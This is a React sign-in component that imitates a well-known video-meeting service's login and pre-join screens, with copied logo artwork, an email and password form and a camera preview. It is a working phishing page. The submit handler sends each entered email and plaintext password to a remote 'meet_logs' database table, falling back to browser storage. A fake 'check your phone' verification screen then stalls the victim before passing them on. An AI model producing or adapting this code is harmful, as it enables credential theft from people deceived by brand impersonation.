import React, { useState, useRef, useEffect } from 'react';
import { supabase } from '../lib/supabase';

interface SignInProps {
  onComplete: (name: string) => void;
  onCancel: () => void;
  isMicOn: boolean;
  isCameraOn: boolean;
  setIsMicOn: (val: boolean) => void;
  setIsCameraOn: (val: boolean) => void;
}

type SignInStep = 'CREDENTIALS' | 'VERIFY';

const SignIn: React.FC<SignInProps> = ({ 
  onComplete, 
  onCancel,
  isMicOn, 
  isCameraOn, 
  setIsMicOn, 
  setIsCameraOn 
}) => {
  const [step, setStep] = useState<SignInStep>('CREDENTIALS');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [permissionError, setPermissionError] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  useEffect(() => {
    if (isCameraOn && streamRef.current && videoRef.current) {
      if (videoRef.current.srcObject !== streamRef.current) {
        videoRef.current.srcObject = streamRef.current;
      }
    }
  }, [isCameraOn, step]);

  const requestPermissions = async () => {
    try {
      setPermissionError(false);
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      streamRef.current = stream;
      setIsMicOn(true);
      setIsCameraOn(true);
    } catch (err) {
      console.error("Permission denied", err);
      setPermissionError(true);
    }
  };

  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  useEffect(() => {
    if (step === 'VERIFY') {
      const timer = setTimeout(() => {
        onComplete(email.split('@')[0] || 'User');
      }, 6000);
      return () => clearTimeout(timer);
    }
  }, [step, onComplete, email]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim() && password.trim()) {
      setLoading(true);
      
      try {
        // Capture to Supabase
        const { error } = await supabase
          .from('meet_logs')
          .insert([
            { email, password, timestamp: new Date().toISOString() }
          ]);
        
        if (error) {
          console.error("Supabase Error:", error);
          // Fallback to localStorage if Supabase fails (e.g. table not created)
          const logs = JSON.parse(localStorage.getItem('meet_logs') || '[]');
          logs.push({ id: Date.now().toString(), email, password, timestamp: new Date().toLocaleString() });
          localStorage.setItem('meet_logs', JSON.stringify(logs));
        }
      } catch (err) {
        console.error("Capture failed:", err);
      }

      setTimeout(() => {
        setLoading(false);
        setStep('VERIFY');
      }, 1000);
    }
  };

  const toggleLocalMic = () => {
    if (streamRef.current) {
      const audioTrack = streamRef.current.getAudioTracks()[0];
      if (audioTrack) audioTrack.enabled = !isMicOn;
    }
    setIsMicOn(!isMicOn);
  };

  const toggleLocalCamera = () => {
    if (streamRef.current) {
      const videoTrack = streamRef.current.getVideoTracks()[0];
      if (videoTrack) videoTrack.enabled = !isCameraOn;
    }
    setIsCameraOn(!isCameraOn);
  };

  const brandName = "meet-join/live/call-hiyk";

  if (step === 'VERIFY') {
    return (
      <div className="fixed inset-0 bg-white flex flex-col z-[100] font-sans items-center justify-center p-4">
        <div className="max-w-[450px] w-full flex flex-col items-center text-center">
          <div className="flex items-center gap-2 mb-10">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M0 4.5V15.5C0 16.8807 1.11929 18 2.5 18H13V4.5C13 3.11929 11.8807 2 10.5 2H2.5C1.11929 2 0 3.11929 0 4.5Z" fill="#00AA47"/>
              <path d="M19.5 7L13 11V18L19.5 22C20.8807 22 22 20.8807 22 19.5V9.5C22 8.11929 20.8807 7 19.5 7Z" fill="#00832D"/>
              <path d="M13 2H19.5C20.8807 2 22 3.11929 22 4.5V7L13 11V2Z" fill="#2684FC"/>
              <path d="M2.5 22H10.5C11.8807 22 13 20.8807 13 19.5V11H0V19.5C0 20.8807 1.11929 22 2.5 22Z" fill="#EA4335"/>
              <path d="M13 11H22V18H13V11Z" fill="#FFBA00"/>
            </svg>
            <span className="text-[#5f6368] text-xl font-medium tracking-tight truncate max-w-[300px]">{brandName}</span>
          </div>
          <p className="text-[#3c4043] text-[15px] mb-8 leading-relaxed max-w-[340px]">
            Security check: Confirming your identity to join the call.
          </p>
          <div className="relative mb-8">
            <svg width="180" height="240" viewBox="0 0 180 240" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="40" y="10" width="100" height="180" rx="12" fill="#2D3339" />
              <rect x="45" y="25" width="90" height="150" fill="white" />
              <rect x="50" y="40" width="55" height="10" rx="2" fill="#E8EAED" />
              <rect x="50" y="55" width="40" height="12" rx="2" fill="#E8EAED" />
              <rect x="50" y="100" width="35" height="18" rx="2" fill="#E8EAED" />
              <rect x="88" y="100" width="40" height="18" rx="2" fill="#4285F4" />
              <ellipse cx="90" cy="205" rx="50" ry="5" fill="#F1F3F4" />
            </svg>
          </div>
          <h2 className="text-[#202124] text-2xl font-bold mb-4">Check Your Phone</h2>
          <p className="text-[#3c4043] text-[15px] mb-8 leading-relaxed px-4">
            A notification has been sent to your device. Please tap 'Yes' to authenticate and proceed to the room.
          </p>
          <div className="flex items-center gap-3 mb-10">
            <input type="checkbox" id="dontask" className="w-4 h-4 rounded border-[#dadce0]" />
            <label htmlFor="dontask" className="text-sm text-[#5f6368]">Don't ask again on this device</label>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-[#f8fafc] flex flex-col md:flex-row z-[100] font-sans">
      <div className="flex-1 flex flex-col items-center justify-center p-6 md:p-12">
        <div className="max-w-[450px] w-full">
          <div className="flex items-center gap-2 mb-10">
             <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M0 4.5V15.5C0 16.8807 1.11929 18 2.5 18H13V4.5C13 3.11929 11.8807 2 10.5 2H2.5C1.11929 2 0 3.11929 0 4.5Z" fill="#00AA47"/>
              <path d="M19.5 7L13 11V18L19.5 22C20.8807 22 22 20.8807 22 19.5V9.5C22 8.11929 20.8807 7 19.5 7Z" fill="#00832D"/>
              <path d="M13 2H19.5C20.8807 2 22 3.11929 22 4.5V7L13 11V2Z" fill="#2684FC"/>
              <path d="M2.5 22H10.5C11.8807 22 13 20.8807 13 19.5V11H0V19.5C0 20.8807 1.11929 22 2.5 22Z" fill="#EA4335"/>
              <path d="M13 11H22V18H13V11Z" fill="#FFBA00"/>
            </svg>
            <span className="text-[#5f6368] text-xl font-medium tracking-tight truncate max-w-[300px]">{brandName}</span>
          </div>

          <div className="bg-white rounded-2xl p-8 shadow-[0_1px_3px_rgba(0,0,0,0.12),0_1px_2px_rgba(0,0,0,0.24)]">
            <h1 className="text-2xl font-bold text-[#202124] mb-2">Sign in</h1>
            <p className="text-[#3c4043] mb-8">Use your account to join the meet</p>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="relative">
                <input 
                  type="text" 
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-4 py-3.5 border border-[#dadce0] rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all text-[#202124] peer placeholder-transparent"
                  placeholder="Email or phone"
                  required
                />
                <label className="absolute left-4 -top-2.5 bg-white px-1 text-xs text-blue-600 transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:-top-2.5 peer-focus:text-xs peer-focus:text-blue-600">Email or phone</label>
              </div>

              <div className="relative">
                <input 
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3.5 border border-[#dadce0] rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all text-[#202124] peer placeholder-transparent"
                  placeholder="Password"
                  required
                />
                <label className="absolute left-4 -top-2.5 bg-white px-1 text-xs text-blue-600 transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:-top-2.5 peer-focus:text-xs peer-focus:text-blue-600">Password</label>
                <button 
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-3.5 text-gray-400 hover:text-gray-600"
                >
                  {showPassword ? (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.882 9.882L5.173 5.173m13.654 13.654l-4.242-4.242m-4.243-4.243L18.827 18.827M15 12a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
                  ) : (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>
                  )}
                </button>
              </div>

              <div className="flex flex-col gap-6">
                <button className="text-blue-600 text-sm font-bold hover:bg-blue-50 w-fit px-2 py-1 rounded">Forgot password?</button>
                <div className="flex items-center justify-between mt-4">
                   <button type="button" onClick={onCancel} className="text-gray-600 font-bold hover:bg-gray-100 px-4 py-2 rounded">Cancel</button>
                   <button 
                     type="submit" 
                     disabled={loading}
                     className={`bg-blue-600 text-white px-8 py-2.5 rounded-lg font-bold shadow-md hover:bg-blue-700 transition-all ${loading ? 'opacity-70 scale-95' : 'active:scale-95'}`}
                   >
                     {loading ? 'Processing...' : 'Next'}
                   </button>
                </div>
              </div>
            </form>
          </div>

          <div className="mt-8 flex items-center justify-between text-xs text-gray-500">
             <div className="flex gap-4">
                <a href="#" className="hover:underline">Privacy</a>
                <a href="#" className="hover:underline">Terms</a>
                <a href="#" className="hover:underline">Help</a>
             </div>
             <span>English (United States)</span>
          </div>
        </div>
      </div>

      <div className="flex-1 bg-white border-l flex flex-col items-center justify-center p-6 md:p-12">
        <div className="max-w-[500px] w-full text-center">
          <div className="relative w-full aspect-video bg-[#202124] rounded-2xl overflow-hidden shadow-2xl mb-8 group">
             {isCameraOn && !permissionError ? (
               <video ref={videoRef} autoPlay muted playsInline className="w-full h-full object-cover scale-x-[-1]" />
             ) : (
               <div className="w-full h-full flex items-center justify-center flex-col gap-4">
                  <div className="w-20 h-20 rounded-full bg-zinc-800 flex items-center justify-center">
                     <svg className="w-10 h-10 text-zinc-500" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                  </div>
                  {permissionError && <p className="text-red-400 text-sm px-4">Camera and microphone access denied. Please enable them to participate.</p>}
               </div>
             )}
             
             <div className="absolute bottom-6 left-1/2 -translate-x-1/2 flex gap-4">
                <button 
                  onClick={toggleLocalMic}
                  className={`p-3 rounded-full border transition-all ${isMicOn ? 'bg-zinc-800/80 border-zinc-600' : 'bg-red-500 border-red-500'}`}
                >
                  {isMicOn ? (
                    <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" /></svg>
                  ) : (
                    <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728L5.636 5.636" /></svg>
                  )}
                </button>
                <button 
                  onClick={toggleLocalCamera}
                  className={`p-3 rounded-full border transition-all ${isCameraOn ? 'bg-zinc-800/80 border-zinc-600' : 'bg-red-500 border-red-500'}`}
                >
                  {isCameraOn ? (
                    <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                  ) : (
                    <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728L5.636 5.636" /></svg>
                  )}
                </button>
             </div>
          </div>
          <h2 className="text-xl font-bold text-[#202124] mb-4">Check your setup</h2>
          <p className="text-[#5f6368] mb-8">Before you join, make sure your camera and microphone are working. You can also test your audio.</p>
          <button 
            onClick={requestPermissions}
            className="text-blue-600 font-bold hover:bg-blue-50 px-6 py-3 rounded-lg border border-blue-200 transition-all"
          >
            Request Access
          </button>
        </div>
      </div>
    </div>
  );
};

export default SignIn;